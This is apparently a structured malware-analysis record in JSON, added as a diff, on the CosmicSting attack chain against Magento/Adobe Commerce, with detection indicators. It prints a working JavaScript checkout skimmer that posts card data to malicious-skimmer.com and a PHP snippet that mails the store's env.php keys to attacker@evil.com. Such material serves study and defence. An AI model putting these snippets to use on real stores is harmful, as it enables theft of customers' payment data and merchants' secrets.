@@ -1,0 +1,104 @@
+{
+  "package_info": {
+    "package_name": "Adobe Commerce / Magento (CosmicSting attack chain)",
+    "package_manager": "custom (Adobe Commerce/Magento platform)",
+    "package_versions": "Adobe Commerce 2.4.7 and earlier, Adobe Commerce Extended Support 2.4.3-ext-7 and earlier, Magento Open Source 2.4.7 and earlier, Adobe Commerce Webhooks Plugin 1.2.0 to 1.4.0",
+    "why_malicious": "The affected package versions contain a critical information disclosure vulnerability (CVE-2024-34102) that, when chained with a glibc iconv flaw (CVE-2024-2961), enables remote code execution. Attackers exploit these vulnerabilities to inject payment skimmers, steal cryptographic keys, and exfiltrate sensitive customer and payment data. This makes all listed versions highly susceptible to compromise, facilitating persistent malicious activity and large-scale data theft."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (order checkout page load and form submission)",
+        "file_location": "Injected JavaScript in order checkout webpage (frontend template or loaded via compromised admin panel)",
+        "required_permissions": [
+          "filesystem (write access to web templates or frontend assets)",
+          "network (outbound HTTP/S from client browser)",
+          "environment_vars (access to session and cookie data in browser context)"
+        ]
+      },
+      "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  var form = document.querySelector('form.checkout');\n  if (form) {\n    form.addEventListener('submit', function() {\n      var cardData = {\n        number: document.querySelector('input[name=\"cardnumber\"]').value,\n        expiry: document.querySelector('input[name=\"expdate\"]').value,\n        cvv: document.querySelector('input[name=\"cvv\"]').value\n      };\n      fetch('https://malicious-skimmer.com/collect', {\n        method: 'POST',\n        body: JSON.stringify(cardData),\n        headers: { 'Content-Type': 'application/json' }\n      });\n    });\n  }\n});",
+      "code_language": "javascript",
+      "code_behavior": "At runtime, the code attaches event listeners to the checkout form, intercepts form submission, collects credit card data from input fields, and sends this data via HTTPS POST to a hardcoded attacker-controlled domain, resulting in exfiltration of payment information.",
+      "malice_analysis": {
+        "why_suspicious": "The code intercepts sensitive payment data from the checkout form and exfiltrates it to an external, untrusted domain, which is a hallmark of web skimming (Magecart) attacks.",
+        "violated_expectations": "Legitimate checkout scripts should only transmit payment data to trusted payment processors or gateways, never to arbitrary external domains controlled by attackers.",
+        "similar_legitimate_use": "Form validation or analytics scripts may read form fields for validation or tracking, but should never transmit full cardholder data (number, expiry, CVV) to untrusted or non-payment domains.",
+        "key_indicators": [
+          "JavaScript event listeners specifically targeting payment or checkout forms",
+          "Outbound HTTPS POST requests from client-side code to domains not associated with the merchant or payment processor",
+          "Collection and serialization of card number, expiry, and CVV fields",
+          "Hardcoded external domain (e.g., malicious-skimmer.com) in fetch or AJAX requests"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "post-exploitation (after remote code execution via CVE-2024-34102 and CVE-2024-2961 chain)",
+        "file_location": "Magento server filesystem (malicious PHP file or injected shell command)",
+        "required_permissions": [
+          "filesystem (read access to /app/etc/env.php and other config files)",
+          "network (outbound SMTP/email or HTTP/S for exfiltration)"
+        ]
+      },
+      "code_snippet": "<?php\n$key = file_get_contents('/app/etc/env.php');\nmail('attacker@evil.com', 'Magento Key', $key);\n?>",
+      "code_language": "php",
+      "code_behavior": "After remote code execution, the code reads the Magento cryptographic key from the /app/etc/env.php configuration file and exfiltrates its contents via email to an attacker-controlled address, enabling further compromise or decryption of sensitive data.",
+      "malice_analysis": {
+        "why_suspicious": "Reading cryptographic keys from configuration files and exfiltrating them via email is a high-impact malicious action that can enable attackers to decrypt sensitive data, forge tokens, or escalate privileges.",
+        "violated_expectations": "Legitimate Magento code or extensions should never transmit cryptographic keys or configuration secrets outside the server environment, especially not to untrusted email addresses.",
+        "similar_legitimate_use": "Backup or migration scripts may read configuration files for legitimate purposes, but should not send their contents to external parties or over unencrypted channels.",
+        "key_indicators": [
+          "Access to /app/etc/env.php or other sensitive configuration files via file_get_contents or similar functions",
+          "Use of mail() or other outbound communication functions to transmit secrets",
+          "Presence of hardcoded external email addresses in PHP code",
+          "Exfiltration of configuration data outside the server environment"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Exploit CVE-2024-34102 (CosmicSting) to gain information disclosure and, when chained with CVE-2024-2961, achieve remote code execution on the Magento server.",
+      "implemented_by": [],
+      "leads_to": "Ability to execute arbitrary code on the server"
+    },
+    {
+      "step": 2,
+      "action": "Read and exfiltrate Magento cryptographic keys from server configuration files.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker gains ability to decrypt sensitive data or further manipulate the store"
+    },
+    {
+      "step": 3,
+      "action": "Inject malicious JavaScript payment skimmer into checkout pages to steal customer credit card data.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Continuous exfiltration of payment data from customers"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Unexpected JavaScript event listeners attached to checkout or payment forms in frontend code",
+      "Outbound network requests from client-side JavaScript to domains not associated with the merchant or payment processor",
+      "Server-side access to /app/etc/env.php or other sensitive Magento configuration files by non-core code",
+      "Outbound email or HTTP requests containing cryptographic keys or configuration data"
+    ],
+    "file_indicators": [
+      "Modified or newly injected JavaScript in checkout page templates or frontend assets",
+      "New or modified PHP files containing mail() and file_get_contents('/app/etc/env.php')",
+      "Unusual changes or access patterns to /app/etc/env.php or related configuration files"
+    ],
+    "network_indicators": [
+      "HTTP POST requests from client browsers to domains such as malicious-skimmer.com or other untrusted endpoints",
+      "Outbound emails from the server to attacker-controlled addresses (e.g., attacker@evil.com)",
+      "Connections from the Magento server or client browsers to known skimmer command-and-control (C2) domains"
+    ],
+    "how_to_detect": "Monitor for unauthorized modifications to checkout page templates and injected JavaScript, especially code that collects and transmits payment data to external domains. Implement file integrity monitoring on key Magento files and configuration files. Audit server logs for access to /app/etc/env.php and for outbound emails or HTTP requests containing cryptographic material. Use network monitoring to detect suspicious exfiltration patterns, such as POST requests to untrusted domains or emails sent to non-corporate addresses. Correlate these indicators to identify compromise and skimming activity."
+  }
+}
